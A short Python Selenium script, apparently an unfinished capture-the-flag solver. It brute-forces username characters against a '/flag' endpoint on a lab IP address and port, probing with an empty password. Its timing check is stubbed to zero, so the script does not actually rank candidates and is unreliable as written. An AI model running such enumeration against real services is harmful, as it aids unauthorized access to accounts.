from selenium import webdriver
from selenium.webdriver.common.by import By
import time
import requests
import urllib.parse
import string

URL = "http://159.65.133.6:30370"

chrome_options = webdriver.ChromeOptions()
chrome_options.add_argument("--incognito")
client = webdriver.Chrome(chrome_options=chrome_options,
    executable_path=r"/tmp/chromedriver")
client.set_page_load_timeout(10)
client.set_script_timeout(10)

client.get(URL)
time.sleep(3)


def enumchar(existing, length=10):
    prob = []
    for c in charset:
        username = existing + c + ('a' * (length - len(existing) -1))
        password = ''
        t = 0#flag(username, password)
        client.get(URL+f"/flag?username={urllib.parse.quote_plus(username)}&password={urllib.parse.quote_plus(password)}")
        time.sleep(0.7)
        prob.append((t,c, username, password))
    prob.sort(reverse=True, key=lambda x: x[0])
    return prob
    

charset = string.printable
enumchar('') #f6')
    
time.sleep(300)
client.quit()
